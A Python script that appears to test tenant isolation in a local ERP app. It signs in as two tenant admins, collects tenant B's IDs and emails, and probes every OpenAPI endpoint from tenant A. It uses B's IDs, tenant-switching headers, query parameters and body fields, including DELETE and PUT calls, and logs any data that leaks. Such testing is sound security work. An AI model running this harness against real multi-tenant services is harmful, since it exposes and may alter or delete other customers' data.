#!/usr/bin/env python3
import urllib.parse
"""Black-box tenant isolation attack: signed in as tenant A (alnoor), try to reach tenant B (gulfsteel)."""
import json, sys, re, urllib.request, urllib.error, http.cookiejar, itertools, uuid
BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:20050"
PW = "Demo-Pass-2026"

def client():
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    return op, cj

def req(op, method, path, body=None, headers=None, token=None):
    h = {"X-Erp-Request": "1", "Content-Type": "application/json", "Accept": "application/json"}
    if token: h["Authorization"] = "Bearer " + token
    h.update(headers or {})
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(BASE + path, data=data, method=method, headers=h)
    try:
        with op.open(r, timeout=60) as resp:
            return resp.status, resp.read().decode("utf-8", "replace"), dict(resp.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace"), dict(e.headers)

def sign_in(email):
    op, cj = client()
    s, b, h = req(op, "POST", "/api/auth/sign-in", {"email": email, "password": PW})
    if s >= 300:
        raise SystemExit(f"sign-in {email} -> {s} {b[:300]}")
    tok = next((c.value for c in cj if c.name == "erp_session"), None)
    return op, tok, json.loads(b) if b else {}

opB, tokB, sB = sign_in("admin@gulfsteel.example")
opA, tokA, sA = sign_in("admin@alnoor.example")
spec = json.loads(req(opA, "GET", "/api/openapi/v1.json")[1])
# Harvest B's data.
_, sessB, _ = req(opB, "GET", "/api/auth/session")
sessB = json.loads(sessB)
_, sessA, _ = req(opA, "GET", "/api/auth/session")
sessA = json.loads(sessA)
victim_texts = []
for path in ["/api/identity/users?take=200", "/api/identity/roles", "/api/tenancy/tenant", "/api/lists/identity.users/views", "/api/lists/identity.roles/views"]:
    s, b, _ = req(opB, "GET", path)
    victim_texts.append(b)
blob = "\n".join(victim_texts) + json.dumps(sessB)
guids = set(re.findall(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}", blob))
own_blob = ""
for path in ["/api/identity/users?take=200", "/api/identity/roles", "/api/tenancy/tenant"]:
    own_blob += req(opA, "GET", path)[1]
own_blob += json.dumps(sessA)
own_guids = set(re.findall(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}", own_blob))
victim_ids = sorted(guids - own_guids)
emails = sorted(set(re.findall(r"[\w.+-]+@gulfsteel\.example", blob)))
markers = set(victim_ids) | set(emails) | {"gulfsteel", "Gulf Steel", sessB["tenant"]["nameAr"]}
tenantB = sessB["tenant"]["id"]; markers.add(tenantB)
print(f"victim ids {len(victim_ids)}, victim emails {len(emails)}, tenantB {tenantB}")

def leak(body):
    low = body.lower()
    return [m for m in markers if m.lower() in low]

results = {"requests": 0, "leaks": [], "status": {}}
def note(desc, s, b):
    results["requests"] += 1
    results["status"][str(s)] = results["status"].get(str(s), 0) + 1
    l = leak(b)
    if l and s < 400:
        results["leaks"].append({"req": desc, "status": s, "markers": l[:5], "body": b[:300]})
    elif l:
        results["leaks"].append({"req": desc, "status": s, "markers": l[:5], "body": b[:300], "note": "marker in error body"})

switch_headers = ["X-Tenant-Id", "X-Tenant", "Tenant-Id", "X-Workspace", "X-Erp-Workspace", "Erp-Support-Workspace", "X-Company-Id", "X-Forwarded-Host"]
for path, ops in spec["paths"].items():
    for method, opdef in ops.items():
        M = method.upper()
        if "{" in path:
            names = re.findall(r"\{(\w+)[^}]*\}", path)
            values = victim_ids[:40] + [str(uuid.uuid4())]
            for v in values:
                p = re.sub(r"\{[^}]+\}", v, path)
                body = {} if M in ("POST", "PUT", "PATCH") else None
                if M in ("DELETE", "PUT", "POST") and False:
                    pass
                for who, tok in (("cookie", None), ("bearer", tokA)):
                    s, b, _ = req(opA if who == "cookie" else client()[0], M, p, body, token=tok)
                    note(f"{M} {p} [{who}]", s, b)
        else:
            p = path
            body = {} if M in ("POST", "PUT", "PATCH") else None
            if path.startswith("/api/auth/sign-in") or path.startswith("/api/auth/sign-out"):
                continue
            for h in switch_headers:
                for v in [tenantB, "gulfsteel"]:
                    s, b, _ = req(opA, M, p, body, headers={h: str(v)})
                    note(f"{M} {p} [{h}: {v}]", s, b)
            for q in ["tenantId", "tenant", "workspace", "q", "search", "filter"]:
                for v in [tenantB, "gulfsteel"] + emails[:3]:
                    sep = "&" if "?" in p else "?"
                    s, b, _ = req(opA, M, f"{p}{sep}{q}={urllib.parse.quote(str(v))}", body)
                    note(f"{M} {p}?{q}={v}", s, b)
            if M in ("POST", "PUT"):
                for k in ["tenantId", "tenant_id", "workspaceId", "companyId"]:
                    s, b, _ = req(opA, M, p, {k: tenantB})
                    note(f"{M} {p} body {k}", s, b)
import urllib.parse
# Re-read B's data to check nothing changed.
after = []
for path in ["/api/identity/users?take=200", "/api/identity/roles", "/api/tenancy/tenant"]:
    after.append(req(opB, "GET", path)[1])
print(json.dumps({k: v for k, v in results.items() if k != "leaks"}, indent=1))
print("leaks:", len(results["leaks"]))
for l in results["leaks"][:30]:
    print(" ", json.dumps(l)[:500])
print("B unchanged:", [a == b for a, b in zip(after, victim_texts[:3])])
